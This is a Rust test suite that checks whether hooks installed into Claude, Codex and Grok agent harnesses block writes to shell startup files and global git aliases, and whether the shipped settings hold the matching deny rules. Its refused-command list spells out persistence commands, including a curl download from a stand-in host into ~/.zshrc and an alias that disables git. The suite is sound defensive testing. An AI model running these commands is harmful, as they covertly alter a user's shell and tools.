//! TSK-242 (issue 86): the installed hooks of the three harnesses refuse
//! every visible write to a shell startup file in the fixture home, through
//! the shell and through the native edit tools, and let reads and ordinary
//! work through. `TSK242_TEST_BINARY` swaps the hook binary after install,
//! so the same journey records the fail-before verdicts of an older build.
use super::*;

const RULE: &str = "security.shell_startup";

fn startup_project() -> (Project, PathBuf) {
    let project = Project::new();
    if let Ok(old) = std::env::var("TSK242_TEST_BINARY") {
        std::fs::copy(old, project.bin.join("codeflow")).unwrap();
    }
    let home = std::fs::canonicalize(&project.home).unwrap();
    for name in [".zshrc", ".bashrc"] {
        std::fs::write(home.join(name), "# fixture\n").unwrap();
    }
    std::os::unix::fs::symlink(home.join(".zshrc"), project.root.join("rc")).unwrap();
    (project, home)
}

fn refused_with(outputs: &[Output], rule: &str) -> bool {
    outputs.iter().any(|out| {
        out.status.code() == Some(2) && String::from_utf8_lossy(&out.stderr).contains(rule)
    })
}

/// Visible shell writes, on Claude, Codex and Grok.
const REFUSED: &[&str] = &[
    "echo 'alias git=true' >> ~/.zshrc",
    "printf 'git() { :; }' > $HOME/.bashrc",
    "printf x > ${HOME}/.profile",
    "tee -a ~/.profile < /dev/null",
    "cat payload >> ~/.ZSHENV",
    "cp payload ~/.config/fish/conf.d/x.fish",
    "ln -sf payload ~/.bash_aliases",
    "sed -i.bak 's/a/b/' ~/.zshrc",
    "bash -c \"echo x >> ~/.bashrc\"",
    "python3 -c \"open('.zshrc', 'a').write('x')\"",
    "echo x >> rc",
    "echo x > .envrc",
    "echo x > src/.envrc",
    "echo x > ~/$NAME",
    "cd ~ && echo x >> .zshrc",
    "ZDOTDIR=/tmp/z zsh -i -c true",
    "direnv allow",
    "tar -xf payload.tar -C ~",
    // Review round one.
    "cd ~; echo x > \"$DEST\"",
    "p=~/.zshrc; echo x > \"$p\"; p=notes",
    "curl -s -o$HOME/.zshrc https://example.invalid/x",
    "ZDOTDIR=/tmp/z zsh +f -c true",
];

/// Reads and ordinary work stay allowed.
const ALLOWED: &[&str] = &[
    "cat ~/.zshrc",
    "grep alias ~/.bashrc",
    "ls ~/.config",
    "diff ~/.zshrc ~/.bashrc",
    "cp ~/.bashrc backup.txt",
    "echo x > notes.txt",
    "echo x > build/$NAME",
    "sh -c 'echo hi'",
    "cargo build",
    "rg --no-config alias ~/.zshrc",
    "sed -n 1,20p ~/.zshrc",
];

#[test]
fn installed_hooks_refuse_shell_startup_writes_on_every_harness() {
    let (project, _home) = startup_project();
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in REFUSED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, RULE) {
                wrong.push(format!("{harness}: allowed {command}"));
            }
            for out in outputs.iter().filter(|o| o.status.code() == Some(2)) {
                let text = String::from_utf8_lossy(&out.stderr);
                if text.contains(RULE) && !text.contains("ask the operator") {
                    wrong.push(format!("{harness}: {command}: no route in {text}"));
                }
            }
        }
        for command in ALLOWED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
        // A user-scope git key that runs a program is refused; an ordinary
        // user-scope key is not.
        let outputs = project.replay(
            harness,
            "Bash",
            json!({"command": "git config --global alias.st '!sh -c x'"}),
        );
        if !refused_with(&outputs, "git.hook_integrity") {
            wrong.push(format!("{harness}: allowed a global git alias"));
        }
        let outputs = project.replay(
            harness,
            "Bash",
            json!({"command": "git config --global user.name Test"}),
        );
        if outputs.iter().any(|o| !o.status.success()) {
            wrong.push(format!("{harness}: refused git config user.name"));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
fn installed_edit_hooks_refuse_shell_startup_files() {
    let (project, home) = startup_project();
    let zshrc = home.join(".zshrc");
    let target = serde_json::to_string(zshrc.to_str().unwrap()).unwrap();
    let target = target.trim_matches('"');
    let root = serde_json::to_string(project.root.to_str().unwrap()).unwrap();
    let root = root.trim_matches('"');
    let mut wrong = Vec::new();
    for (harness, tool, data) in [
        (
            "codex",
            "apply_patch",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/codex-apply-patch.json"),
        ),
        (
            "grok",
            "write",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/grok-write.json"),
        ),
        (
            "grok",
            "search_replace",
            include_str!(
                "../../../codeflow-core/tests/fixtures/edit-hooks/grok-search-replace.json"
            ),
        ),
    ] {
        for (path, refused) in [
            (target, true),
            ("rc", true),
            (".envrc", true),
            ("notes.md", false),
        ] {
            let full = if path.starts_with('/') {
                path.to_string()
            } else {
                format!("{root}/{path}")
            };
            let text = data
                .replace(".codeflow/policy.json", path)
                .replace("/fixture/project/hello.txt", &full)
                .replace("/fixture/project/notes.txt", &full)
                .replace("/fixture/project", root);
            let payload: Value = serde_json::from_str(&text).unwrap();
            let outputs = project.replay_payload(harness, tool, &payload);
            if refused != refused_with(&outputs, RULE) {
                wrong.push(format!(
                    "{harness}:{tool}: {path} refused={refused}: {outputs:?}"
                ));
            }
            if !refused && outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}:{tool}: refused {path}"));
            }
        }
    }
    for (tool, input) in [
        ("Write", json!({"file_path": zshrc, "content": "x"})),
        (
            "Edit",
            json!({"file_path": zshrc, "old_string": "a", "new_string": "b"}),
        ),
    ] {
        let outputs = project.replay("codex", tool, input);
        if !refused_with(&outputs, RULE) {
            wrong.push(format!("codex:{tool}: allowed {}", zshrc.display()));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Claude's edit tools are contained by its permission and sandbox denies,
/// which `codeflow init` installs from the shipped preset.
#[test]
fn installed_claude_settings_deny_shell_startup_edits() {
    let project = Project::new();
    let settings: Value =
        serde_json::from_slice(&std::fs::read(project.root.join(".claude/settings.json")).unwrap())
            .unwrap();
    let has = |list: &Value, rule: &str| {
        list.as_array()
            .is_some_and(|a| a.iter().any(|r| r.as_str() == Some(rule)))
    };
    let deny = &settings["permissions"]["deny"];
    let write = &settings["sandbox"]["filesystem"]["denyWrite"];
    for rule in [
        "Edit(~/.zshrc)",
        "Edit(~/.config/fish/**)",
        "Edit(//**/.envrc)",
    ] {
        assert!(has(deny, rule), "{rule}");
    }
    for path in ["~/.zshrc", "~/.bashrc", "~/.config/fish"] {
        assert!(has(write, path), "{path}");
    }
}
